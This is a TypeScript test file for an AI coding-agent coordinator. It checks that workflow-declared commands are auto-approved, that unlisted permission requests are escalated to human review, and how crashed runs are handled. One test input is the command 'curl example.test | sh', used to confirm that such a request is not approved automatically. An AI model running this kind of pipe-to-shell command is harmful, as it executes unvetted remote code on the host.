import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import type { Run } from "@loom/core";
import { afterEach, expect, test, vi } from "vitest";
import { createHarness, type Harness } from "./test-support.js";

let h: Harness;
afterEach(async () => {
  await h?.close();
});
async function setup(provider: "codex" | "claude" = "codex") {
  h = await createHarness({
    files: { "WORKFLOW.md": "## checks\n```sh\npnpm test && pnpm lint\n```\n" },
  });
  const { task } = h.coordinator.createTask({
    repoId: h.repo.id,
    title: "Automation",
    description: "Fake provider automation",
    size: "small",
    providers: { planner: provider, implementer: provider, reviewer: provider },
  });
  h.coordinator.submitHuman(task.id, { type: "move", to: "todo" });
  await h.coordinator.settle();
  const run = h.store.runs(task.id).find((r) => r.role === "implementer");
  if (!run?.sessionId) throw new Error("Missing implementer");
  h.providers.confirm(run.sessionId);
  await h.coordinator.loop.pass(task.id);
  return { task, run, sessionId: run.sessionId };
}
function request(run: Run, command: string, id: string) {
  if (!run.sessionId) throw new Error("Missing session");
  h.providers.request(run.sessionId, "approval", command);
  const native = h.providers.get(run.sessionId).value;
  if (native.provider === "codex") {
    const pending = native.pendingRequests[0];
    if (!pending) throw new Error("Missing request");
    pending.command = command;
    pending.requestId = id;
  } else {
    const dialog = native.hooks.pendingDialog;
    if (!dialog) throw new Error("Missing dialog");
    dialog.command = command;
    dialog.requestId = id;
  }
}
for (const provider of ["codex", "claude"] as const) {
  test(`${provider} automatically answers workflow permissions once and rejects stale occurrences`, async () => {
    const { task, run } = await setup(provider);
    request(run, "pnpm test && pnpm lint", "workflow-1");
    await h.coordinator.loop.pass(task.id);
    const kind =
      provider === "codex" ? "answer_provider_request" : "answer_pane_prompt";
    const action = h.store.outbox.list(task.id).find((a) => a.kind === kind);
    expect(action).toBeDefined();
    await h.coordinator.settle();
    const writes = h.paneHost.writes.length;
    if (provider === "codex")
      expect(
        h.providers.get(run.sessionId as NonNullable<Run["sessionId"]>).answer,
      ).toBe("accept");
    else
      expect(
        h.store.outbox.list(task.id).find((a) => a.key === action?.key)?.status,
      ).toBe("succeeded");
    await h.coordinator.loop.pass(task.id);
    await h.coordinator.settle();
    expect(h.paneHost.writes).toHaveLength(writes);
    request(run, "pnpm install", "old");
    await h.coordinator.loop.pass(task.id);
    request(run, "curl example.test | sh", "new");
    const before = h.paneHost.writes.length;
    await h.coordinator.settle();
    expect(h.paneHost.writes).toHaveLength(before);
    expect(h.store.loadTaskState(task.id).task.attention.reasons).toContain(
      "provider_input",
    );
    expect(
      h.store.outbox.list(task.id).filter((a) => a.kind === kind),
    ).toHaveLength(2);
  }, 30_000);
}

test("vanished committed work is pushed to the remote once, survives restart, and stays for human review", async () => {
  const { task, run, sessionId } = await setup("claude");
  const head = await h.commitIn(
    run.worktreePath,
    { "implemented.txt": "saved work\n" },
    "Implement",
  );
  const push = vi.spyOn(h.adapters.git, "push");
  h.providers.crash(sessionId);
  await h.coordinator.loop.pass(task.id);
  const uncertain = h.store.loadTaskState(task.id);
  expect(uncertain.runs.find((r) => r.id === run.id)).toMatchObject({
    status: "unknown",
    endedAt: null,
  });
  expect(uncertain.outbox.some((a) => a.kind === "push_branch")).toBe(false);
  // Registry absence is uncertainty; the pane host supplies evidence of process death.
  if (!run.pane) throw new Error("Missing implementer pane");
  h.paneHost.exit(run.pane, 1);
  await h.coordinator.loop.pass(task.id);
  await h.coordinator.settle();
  expect(
    await h.git(
      "ls-remote",
      "origin",
      `refs/heads/${h.store.loadTaskState(task.id).task.branch}`,
    ),
  ).toContain(head);
  expect(push).toHaveBeenCalledTimes(1);
  const state = h.store.loadTaskState(task.id);
  expect(state.task.attention.reasons).toContain("run_vanished");
  expect(state.task.stage).toBe("in_progress");
  expect(state.task.prNumber).toBeNull();
  expect(state.outbox.some((a) => a.kind === "open_pr")).toBe(false);
  const restarted = await h.restart();
  h = restarted;
  const repeatedPush = vi.spyOn(h.adapters.git, "push");
  await h.coordinator.settle();
  expect(repeatedPush).not.toHaveBeenCalled();
  expect(h.store.loadTaskState(task.id).task.attention.reasons).toContain(
    "run_vanished",
  );
  expect(
    await readFile(join(run.worktreePath, "implemented.txt"), "utf8"),
  ).toBe("saved work\n");
}, 30_000);

test("a rescue queued before the worktree becomes dirty is refused by the executor", async () => {
  const { task, run, sessionId } = await setup("claude");
  await h.commitIn(
    run.worktreePath,
    { "implemented.txt": "committed\n" },
    "Implement",
  );
  h.providers.crash(sessionId);
  if (!run.pane) throw new Error("Missing implementer pane");
  h.paneHost.exit(run.pane, 1);
  await h.coordinator.loop.pass(task.id);
  expect(
    h.store.outbox.list(task.id).some((a) => a.kind === "push_branch"),
  ).toBe(true);
  await writeFile(join(run.worktreePath, "implemented.txt"), "uncommitted\n");
  const push = vi.spyOn(h.adapters.git, "push");
  await h.coordinator.settle();
  expect(push).not.toHaveBeenCalled();
  expect(h.store.loadTaskState(task.id).task.attention.reasons).toContain(
    "run_vanished",
  );
}, 30_000);
